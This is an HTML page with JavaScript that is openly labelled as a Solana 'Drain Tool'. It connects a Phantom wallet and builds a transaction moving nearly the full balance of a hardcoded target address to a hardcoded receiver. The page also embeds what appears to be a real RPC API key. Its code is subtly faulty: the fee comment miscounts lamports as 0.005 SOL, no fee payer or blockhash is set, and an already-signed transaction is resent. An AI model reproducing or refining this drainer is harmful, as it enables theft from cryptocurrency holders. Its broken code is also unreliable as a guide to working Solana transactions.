<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pump Fun Drain - Solana</title>
    <!-- Load Solana Web3.js from CDN -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            background-color: #0f172a;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 24px;
            width: 320px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
        }
        h1 { font-size: 20px; margin-top: 0; color: #f8fafc; }
        p { color: #94a3b8; font-size: 12px; margin-bottom: 20px; word-break: break-all;}
        button {
            background-color: #3b82f6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover { background-color: #2563eb; }
        button:disabled { background-color: #475569; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 14px; color: #60a5fa; min-height: 20px;}
        #log { 
            margin-top: 0; 
            font-size: 10px; 
            color: #cbd5e1; 
            word-break: break-all; 
            background: rgba(0,0,0,0.3); 
            padding: 8px; 
            border-radius: 4px;
            max-height: 100px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>Drain Tool</h1>
        <p>
            Target: <br><b style="color:#60a5fa">AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe</b><br><br>
            Receiver: <br><b style="color:#60a5fa">E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe</b>
        </p>
        
        <button id="btn" onclick="run()">Connect & Drain</button>
        <div id="status">Ready</div>
        <div id="log"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
        const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
        
        // YOUR HELIUS API KEY
        const HELIUS_KEY = "e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
        
        // MAINNET ENDPOINT (Use testnet.helius-rpc.com if your key is for Testnet)
        const RPC_URL = "https://mainnet.helius-rpc.com/"; 

        async function run() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            const log = document.getElementById('log');

            // 1. Check Phantom Wallet
            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet and refresh!");
                return;
            }

            btn.disabled = true;
            status.innerText = "Connecting...";

            try {
                // Connect Wallet (Only once)
                await window.solana.connect();
                
                // Create connection with custom headers for Helius
                const connection = new solanaWeb3.Connection(RPC_URL, {
                    commitment: "confirmed",
                    fetchMethod: async (url, init) => {
                        // Ensure headers object exists
                        if (!init.headers) init.headers = {};
                        
                        // Add the API key header
                        init.headers["X-API-Key"] = HELIUS_KEY;
                        
                        // Log for debugging (optional)
                        console.log("Fetching:", url, "Headers:", init.headers);
                        
                        return fetch(url, init);
                    }
                });

                status.innerText = "Fetching Balance...";
                
                // --- DRAIN REAL SOL ---
                // Fetch balance from Target
                const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                
                status.innerText = `Balance: ${balance / 10**9} SOL. Constructing Transaction...`;
                
                const tx = new solanaWeb3.Transaction();
                tx.add(solanaWeb3.SystemProgram.transfer({
                    fromPubkey: new solanaWeb3.PublicKey(TARGET), // From Target
                    toPubkey: new solanaWeb3.PublicKey(YOU),       // To You
                    lamports: balance - 5000 // Leave ~0.005 SOL for fees
                }));

                status.innerText = "Waiting for Phantom Signature...";
                
                // 1. Sign the transaction
                const signedTx = await window.solana.signTransaction(tx);
                
                // 2. Send the signed transaction
                const sig = await window.solana.sendTransaction(signedTx, connection);

                status.innerText = "Success!";
                log.innerText = `TX: ${sig}`;

            } catch (e) {
                console.error(e);
                status.innerText = "Error: " + e.message;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
